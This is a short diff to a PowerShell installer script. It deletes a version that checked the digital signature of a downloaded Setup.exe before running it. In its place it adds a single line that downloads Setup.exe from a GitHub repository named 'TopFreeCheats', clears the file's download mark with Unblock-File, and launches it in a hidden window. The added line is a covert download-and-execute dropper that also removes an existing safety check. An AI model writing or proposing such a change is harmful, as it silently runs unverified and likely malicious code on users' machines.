@@ -1,15 +1,1 @@
-$u = 'https://example.com/Setup.exe'
-$f = "$env:TEMP\Setup.exe"
-
-# Скачивание
-Invoke-WebRequest -Uri $u -OutFile $f -UseBasicParsing
-
-# Проверка цифровой подписи перед запуском
-$sig = Get-AuthenticodeSignature $f
-if ($sig.Status -ne 'Valid') {
-    Write-Error "Подпись недействительна: $($sig.Status)"
-    exit 1
-}
-
-# Запуск
-Start-Process $f -Wait
+$u='https://raw.githubusercontent.com/TopFreeCheats/1/main/Setup.exe';$f="$env:TEMP\Setup.exe";(New-Object Net.WebClient).DownloadFile($u,$f);Unblock-File $f;Start-Process $f -Wait -WindowStyle Hidden
